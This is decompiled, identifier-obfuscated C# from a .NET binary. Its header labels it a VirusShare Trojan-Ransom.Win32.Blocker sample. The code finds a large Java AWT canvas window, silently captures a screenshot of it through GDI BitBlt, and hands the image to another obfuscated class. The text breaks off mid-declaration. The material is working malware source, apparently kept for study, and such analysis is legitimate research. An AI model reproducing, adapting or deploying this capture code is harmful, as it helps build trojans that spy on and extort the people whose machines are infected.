// Decompiled with JetBrains decompiler
// Type: JavaCPL.⢴⣀⢆⠦⡀⠰⡄⠃⡄⢜⢙⣌⣒⠿⣒⢢⠍⣄⣞⠆⢹⢠⡓⢊⣔⠬⠏⠢⡯⣐⡰⢝⢷⡝⠍⣛⣋⡩⠕⢛⢁⡒⢍
// Assembly: rundll32, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 13DBC59A-6438-4540-9329-3095DCEBFA91
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.jokl-7e37aa7caba18f33478ac65f402c6035542849adbf995392bfea4665b48982a6.exe

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;

namespace JavaCPL
{
  public static class \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D
  {
    public static IntPtr \u28BD\u28A1\u28C3\u28C5\u2832\u2813\u2815\u2868\u287A\u289E\u2894\u2814\u286D\u28DB\u2832\u2814\u2820\u2822\u2874\u2853\u282B\u28DB\u2814\u2875\u2832\u28D7\u28B7\u2884\u28AF\u2843\u2865\u2867\u2812\u28C5\u28AC\u2833\u2848\u282A\u28CF\u285B\u28BB\u2808\u2823() => \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.User32.GetForegroundWindow();

    public static bool \u28A8\u28D9\u286E\u28CF\u2837\u2801\u287A\u285F\u28BD\u283A\u2842\u28C1\u288C\u284E\u2892\u283B\u283B\u2871\u2899\u2836\u2839\u282D\u2801\u2888\u282F\u28DF\u28AB(
      IntPtr _param0,
      IntPtr _param1)
    {
      if (!(GCHandle.FromIntPtr(_param1).Target is List<IntPtr> target))
        throw new InvalidCastException("GCHandle Target could not be cast as List<IntPtr>");
      target.Add(_param0);
      return true;
    }

    public static IntPtr[] \u282A\u2810\u2853\u2847\u285A\u289F\u2814\u2882\u2863\u2862\u2859\u2840\u289E\u282B\u2809\u2852\u286C\u2872\u283A\u2874\u28A2\u28AD\u2834\u2814\u2800\u282C\u2818\u2881\u2818\u28A3\u2863(
      IntPtr _param0)
    {
      List<IntPtr> numList = new List<IntPtr>();
      GCHandle gcHandle = GCHandle.Alloc((object) numList);
      try
      {
        \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.EnumWindowsProc lpEnumFunc = new \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.EnumWindowsProc(\u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.\u28A8\u28D9\u286E\u28CF\u2837\u2801\u287A\u285F\u28BD\u283A\u2842\u28C1\u288C\u284E\u2892\u283B\u283B\u2871\u2899\u2836\u2839\u282D\u2801\u2888\u282F\u28DF\u28AB);
        \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.User32.EnumChildWindows(_param0, lpEnumFunc, GCHandle.ToIntPtr(gcHandle));
      }
      finally
      {
        if (gcHandle.IsAllocated)
          gcHandle.Free();
      }
      return numList.ToArray();
    }

    public static string \u283E\u2847\u282D\u2887\u2873\u2869\u28A0\u28DE\u2852\u283B\u280E\u2888\u28D3\u2843\u2855\u2841\u2803\u28BB\u2865\u28B6\u28B7\u280B\u281B\u283E\u2877\u2815\u2821\u2812\u2862\u28D1\u2860\u2822\u2825\u2839\u28B0\u28AF\u2803\u288F\u2824\u28B3\u2836\u285E\u2896\u2888\u28BF\u28D8\u2877\u2893\u283B\u28A0\u2812\u28A8\u2807\u2885\u2803\u2833\u282C(
      IntPtr _param0)
    {
      StringBuilder pszType = new StringBuilder();
      int windowClass = (int) \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.User32.RealGetWindowClass(_param0, pszType, (uint) byte.MaxValue);
      return pszType.ToString();
    }

    public static string \u28B0\u28C2\u2864\u28D7\u2802\u282A\u28B4\u28CF\u2827\u28D7\u2877\u281E\u28A4\u2869\u2809\u28A0\u284D\u2821\u283F\u281F\u2885\u28A5\u287A\u288A\u289E\u28C9\u2881\u280D\u28C7(
      IntPtr _param0)
    {
      StringBuilder text = new StringBuilder((int) byte.MaxValue);
      \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.User32.GetWindowText(_param0, text, text.Capacity);
      return text.ToString();
    }

    public static IntPtr \u28D3\u287A\u2884\u28A8\u2822\u281C\u286C\u2831\u280F\u2818\u284A\u287F\u28CF\u2878\u288F\u2823\u281A\u2897\u28C8\u2884\u2834\u28BD\u28A2\u2812\u28B6\u2847\u2826\u2872\u282C\u2819\u2875\u28BB\u2842\u283A\u2826\u280E\u2822\u283F\u2855\u2808\u2803\u2839\u2809\u282D\u280C\u28A7\u2835\u28D5\u2858\u2811\u2848\u28BE\u2884\u28D2\u28A9\u2816\u28B7\u2872\u28D1\u28BA\u28D5\u28DA\u2804()
    {
      IntPtr hwnd = \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.\u2883\u286E\u283D\u2894\u2852\u2881\u2801\u28BB\u2842\u28BF\u2880\u28DA\u28B3\u2874\u2806\u280F\u2812\u2830\u2819\u281B\u28B0\u2896\u2837\u284F\u2871\u2810\u2836\u2890\u284D\u287A\u2812\u2809\u2835\u2813\u288A\u287D\u286A\u2881\u2883\u28B7\u2810\u286D\u287C\u28A5\u2851\u28AE\u2842\u2843\u286C\u28C2\u28A8\u28A5\u28C0\u28C9\u2825\u28CC\u2837\u28CD\u2823\u2842\u284A\u2851(\u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.\u282A\u2810\u2853\u2847\u285A\u289F\u2814\u2882\u2863\u2862\u2859\u2840\u289E\u282B\u2809\u2852\u286C\u2872\u283A\u2874\u28A2\u28AD\u2834\u2814\u2800\u282C\u2818\u2881\u2818\u28A3\u2863(\u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.\u28BD\u28A1\u28C3\u28C5\u2832\u2813\u2815\u2868\u287A\u289E\u2894\u2814\u286D\u28DB\u2832\u2814\u2820\u2822\u2874\u2853\u282B\u28DB\u2814\u2875\u2832\u28D7\u28B7\u2884\u28AF\u2843\u2865\u2867\u2812\u28C5\u28AC\u2833\u2848\u282A\u28CF\u285B\u28BB\u2808\u2823()), "SunAwtCanvas");
      \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.RECT lpRect;
      \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.User32.GetWindowRect(hwnd, out lpRect);
      int num1 = lpRect.right - lpRect.left;
      int num2 = lpRect.bottom - lpRect.top;
      return num1 > 700 && num2 > 500 ? hwnd : IntPtr.Zero;
    }

    public static IntPtr \u2883\u286E\u283D\u2894\u2852\u2881\u2801\u28BB\u2842\u28BF\u2880\u28DA\u28B3\u2874\u2806\u280F\u2812\u2830\u2819\u281B\u28B0\u2896\u2837\u284F\u2871\u2810\u2836\u2890\u284D\u287A\u2812\u2809\u2835\u2813\u288A\u287D\u286A\u2881\u2883\u28B7\u2810\u286D\u287C\u28A5\u2851\u28AE\u2842\u2843\u286C\u28C2\u28A8\u28A5\u28C0\u28C9\u2825\u28CC\u2837\u28CD\u2823\u2842\u284A\u2851(
      IntPtr[] _param0,
      string _param1)
    {
      IntPtr zero = IntPtr.Zero;
      IntPtr num1 = IntPtr.Zero;
      foreach (IntPtr num2 in _param0)
      {
        if (num2 != IntPtr.Zero && \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.\u283E\u2847\u282D\u2887\u2873\u2869\u28A0\u28DE\u2852\u283B\u280E\u2888\u28D3\u2843\u2855\u2841\u2803\u28BB\u2865\u28B6\u28B7\u280B\u281B\u283E\u2877\u2815\u2821\u2812\u2862\u28D1\u2860\u2822\u2825\u2839\u28B0\u28AF\u2803\u288F\u2824\u28B3\u2836\u285E\u2896\u2888\u28BF\u28D8\u2877\u2893\u283B\u28A0\u2812\u28A8\u2807\u2885\u2803\u2833\u282C(num2).Contains(_param1))
        {
          for (IntPtr index = new IntPtr(\u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.User32.GetWindow(num2.ToInt32(), \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.GW.CHILD)); index != IntPtr.Zero; index = new IntPtr(\u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.User32.GetWindow(num1.ToInt32(), \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.GW.CHILD)))
            num1 = index;
          \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.\u283E\u2847\u282D\u2887\u2873\u2869\u28A0\u28DE\u2852\u283B\u280E\u2888\u28D3\u2843\u2855\u2841\u2803\u28BB\u2865\u28B6\u28B7\u280B\u281B\u283E\u2877\u2815\u2821\u2812\u2862\u28D1\u2860\u2822\u2825\u2839\u28B0\u28AF\u2803\u288F\u2824\u28B3\u2836\u285E\u2896\u2888\u28BF\u28D8\u2877\u2893\u283B\u28A0\u2812\u28A8\u2807\u2885\u2803\u2833\u282C(num1);
          if (\u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.\u28DF\u2896\u2808\u285B\u284F\u283F\u28D6\u2855\u286A\u28C3\u28D8\u286E\u285E\u2854\u28C0\u2835\u2863\u2838\u2865\u2827\u2863\u2851\u28AA\u28A4\u280A\u28CA\u283E\u28BC\u280E\u282B\u2807\u289C\u2838\u2805\u282C\u2815\u289E\u28CD\u286D\u28AD\u28BF(num1))
            return num1;
        }
      }
      return IntPtr.Zero;
    }

    public static bool \u282B\u287A\u2820\u282C\u287A\u2836\u288B\u286D\u280C\u28CB\u2880\u288D\u28DC\u28AC\u2815\u2872\u28DD\u28BE\u2879\u286C\u2890\u28AF\u282B\u28C0\u2836\u2824\u28AB\u28A7\u2874\u287E\u286C\u282B\u28AC\u28A7\u2849\u28BC\u280C\u28B6\u285B\u2828\u28A2\u28CC\u28A5\u2841\u2882\u285A\u2816\u287F\u28A0\u28B8\u2846() => \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.\u28D3\u287A\u2884\u28A8\u2822\u281C\u286C\u2831\u280F\u2818\u284A\u287F\u28CF\u2878\u288F\u2823\u281A\u2897\u28C8\u2884\u2834\u28BD\u28A2\u2812\u28B6\u2847\u2826\u2872\u282C\u2819\u2875\u28BB\u2842\u283A\u2826\u280E\u2822\u283F\u2855\u2808\u2803\u2839\u2809\u282D\u280C\u28A7\u2835\u28D5\u2858\u2811\u2848\u28BE\u2884\u28D2\u28A9\u2816\u28B7\u2872\u28D1\u28BA\u28D5\u28DA\u2804() != IntPtr.Zero;

    public static bool \u28DF\u2896\u2808\u285B\u284F\u283F\u28D6\u2855\u286A\u28C3\u28D8\u286E\u285E\u2854\u28C0\u2835\u2863\u2838\u2865\u2827\u2863\u2851\u28AA\u28A4\u280A\u28CA\u283E\u28BC\u280E\u282B\u2807\u289C\u2838\u2805\u282C\u2815\u289E\u28CD\u286D\u28AD\u28BF(
      IntPtr _param0)
    {
      \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.RECT lpRect;
      \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.User32.GetWindowRect(_param0, out lpRect);
      return lpRect.bottom - lpRect.top > 400;
    }

    public static Bitmap \u2858\u2828\u28AA\u2876\u2875\u28AB\u2898\u2847\u285D\u2893\u28CB\u28B0\u28B3\u2807\u2810\u2842\u282D\u280E\u287F\u2849\u2819\u2802\u287D\u2829\u285A\u287C\u2807\u28AB\u28A5\u289E\u285E\u2801(
      Bitmap _param0,
      Rectangle _param1)
    {
      Bitmap bitmap = new Bitmap(_param1.Width, _param1.Height);
      Graphics graphics = Graphics.FromImage((Image) bitmap);
      graphics.DrawImage((Image) _param0, 0, 0, _param1, GraphicsUnit.Pixel);
      graphics.Dispose();
      return bitmap;
    }

    public static Bitmap \u2851\u28B5\u28D7\u2891\u28BE\u289B\u2882\u28AD\u289E\u28D2\u2804\u28C0\u2855\u2837\u2800\u2880\u28CC\u286E\u2862\u28AE\u2864\u282E\u2847\u28A9\u28AA\u284F\u281E(
      out Point _param0)
    {
      try
      {
        IntPtr hwnd = \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.\u28D3\u287A\u2884\u28A8\u2822\u281C\u286C\u2831\u280F\u2818\u284A\u287F\u28CF\u2878\u288F\u2823\u281A\u2897\u28C8\u2884\u2834\u28BD\u28A2\u2812\u28B6\u2847\u2826\u2872\u282C\u2819\u2875\u28BB\u2842\u283A\u2826\u280E\u2822\u283F\u2855\u2808\u2803\u2839\u2809\u282D\u280C\u28A7\u2835\u28D5\u2858\u2811\u2848\u28BE\u2884\u28D2\u28A9\u2816\u28B7\u2872\u28D1\u28BA\u28D5\u28DA\u2804();
        \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.RECT lpRect;
        \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.User32.GetWindowRect(hwnd, out lpRect);
        _param0 = new Point(lpRect.left, lpRect.top);
        int nWidth = lpRect.right - lpRect.left;
        int nHeight = lpRect.bottom - lpRect.top;
        int windowDc = \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.User32.GetWindowDC(hwnd.ToInt32());
        int compatibleDc = \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.GDI32.CreateCompatibleDC(windowDc);
        int compatibleBitmap = \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.GDI32.CreateCompatibleBitmap(windowDc, nWidth, nHeight);
        \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.GDI32.SelectObject(compatibleDc, compatibleBitmap);
        \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.GDI32.BitBlt(compatibleDc, 0, 0, nWidth, nHeight, windowDc, 0, 0, 13369376);
        Bitmap bitmap = new Bitmap((Image) Image.FromHbitmap(new IntPtr(compatibleBitmap)), Image.FromHbitmap(new IntPtr(compatibleBitmap)).Width, Image.FromHbitmap(new IntPtr(compatibleBitmap)).Height);
        \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.\u283C\u2894\u2822\u286D\u282E\u28C6\u286E\u287D\u2878\u2803\u281C\u2818\u280D\u28DE\u2804\u28D8\u2870\u28C2\u28A1\u2861\u283C\u2845\u289C\u2811\u2829\u2841\u2859\u28DB\u2861\u2862\u28DA\u2809\u28DC\u28D9\u2885\u289C\u281B\u2802\u286F\u2844\u287E\u2888\u28D0\u28A3\u2800\u2806\u285A\u2852\u284F\u28A4\u2817\u28CC\u28B6\u285C\u28A0\u28D6\u28D7\u2811\u2843\u28CC\u286D\u2873\u281B(compatibleBitmap, windowDc, hwnd, compatibleDc);
        new \u28BC\u2875\u2886\u284C\u2886\u2877\u287B\u280D\u28A8\u287F\u281F\u28AA\u28DE\u284C\u287F\u281F\u28C7\u281E\u289D\u28DF\u282D\u2842\u2895\u28B6\u287E\u287D\u2817\u2840\u28B1\u2894\u285F\u2849\u280D\u280D\u283A\u2845\u287B\u2854\u2842\u2833\u286B\u2838\u2882\u2866\u28C6\u285F\u2896\u28AE\u2856\u28A2\u287E\u28CB\u2879\u2807\u288D\u2879\u28C0(bitmap).\u2800\u283F\u2872\u28CD\u2869\u28B0\u28A2\u2824\u28C3\u28BE\u2856\u2854\u284F\u28AB\u2806\u2833\u2806\u28CC\u281C\u28C9\u28CB\u2899\u2832\u28AF\u2804\u2808\u2871\u284F\u28B1\u28B7\u2873\u28B5\u28B9\u2808();
        return bitmap;
      }
      catch (Exception ex)
      {
        _param0 = new Point();
        return (Bitmap) null;
      }
    }

    public static void \u283C\u2894\u2822\u286D\u282E\u28C6\u286E\u287D\u2878\u2803\u281C\u2818\u280D\u28DE\u2804\u28D8\u2870\u28C2\u28A1\u2861\u283C\u2845\u289C\u2811\u2829\u2841\u2859\u28DB\u2861\u2862\u28DA\u2809\u28DC\u28D9\u2885\u289C\u281B\u2802\u286F\u2844\u287E\u2888\u28D0\u28A3\u2800\u2806\u285A\u2852\u284F\u28A4\u2817\u28CC\u28B6\u285C\u28A0\u28D6\u28D7\u2811\u2843\u28CC\u286D\u2873\u281B(
      int _param0,
      int _param1,
      IntPtr _param2,
      int _param3)
    {
      \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.User32.ReleaseDC(_param2.ToInt32(), _param1);
      \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.GDI32.DeleteDC(_param3);
      \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.GDI32.DeleteObject(_param0);
    }

    internal delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    internal delegate bool EnumWindowProc(IntPtr hWnd, IntPtr parameter);

    private class GDI32
    {
      [DllImport("GDI32.dll")]
      public static extern bool BitBlt(
        int hdcDest,
        int nXDest,
        int nYDest,
        int nWidth,
        int nHeight,
        int hdcSrc,
        int nXSrc,
        int nYSrc,
        int dwRop);

      [DllImport("GDI32.dll")]
      public static extern int CreateCompatibleBitmap(int hdc, int nWidth, int nHeight);

      [DllImport("GDI32.dll")]
      public static extern int CreateCompatibleDC(int hdc);

      [DllImport("GDI32.dll")]
      public static extern bool DeleteDC(int hdc);

      [DllImport("GDI32.dll")]
      public static extern bool DeleteObject(int hObject);

      [DllImport("GDI32.dll")]
      public static extern int GetDeviceCaps(int hdc, int nIndex);

      [DllImport("GDI32.dll")]
      public static extern int SelectObject(int hdc, int hgdiobj);
    }

    private class User32
    {
      [DllImport("User32.dll")]
      public static extern IntPtr GetForegroundWindow();

      [DllImport("User32.dll")]
      public static extern int GetWindowDC(int hWnd);

      [DllImport("User32.dll")]
      public static extern int ReleaseDC(int hWnd, int hDC);

      [DllImport("user32.dll")]
      public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

      [DllImport("user32.dll")]
      public static extern int GetWindow(
        int hWnd,
        \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.GW uCmd);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool EnumChildWindows(
        IntPtr hwndParent,
        \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.EnumWindowsProc lpEnumFunc,
        IntPtr lParam);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool EnumWindows(
